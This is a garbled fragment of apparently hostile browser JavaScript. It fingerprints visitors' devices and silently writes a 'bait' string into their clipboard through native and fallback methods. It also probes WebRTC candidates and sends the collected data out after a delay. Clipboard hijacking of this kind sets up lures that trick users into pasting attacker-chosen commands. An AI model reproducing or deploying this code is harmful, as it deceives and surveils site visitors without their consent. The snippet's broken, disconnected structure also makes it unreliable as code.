        screen: `${screen.width}x${screen.height}`,

        platform: navigator.platform,
        language: navigator.language,
        memory: performance.memory || "Restricted",
        deviceMemory: navigator.deviceMemory || "Restricted",
        hardwareConcurrency: navigator.hardwareConcurrency || "Restricted",

            await navigator.clipboard.writeText(bait);
            injected = true;
            info.clipboardInjected = "native-success";
          } else {
            info.clipboardInjected = "native-denied";
          }

          info.clipboardInjected = "native-error";

        // Fallback to execCommand if native fails

          const ta = document.createElement("textarea");
          ta.value = bait;
          ta.setAttribute("readonly", "");

          info.clipboardInjected = fallbackSuccess ? "fallback-success" : "fallback-failed";

          if (event && event.candidate) {

        setTimeout(() => send(info), 2500);
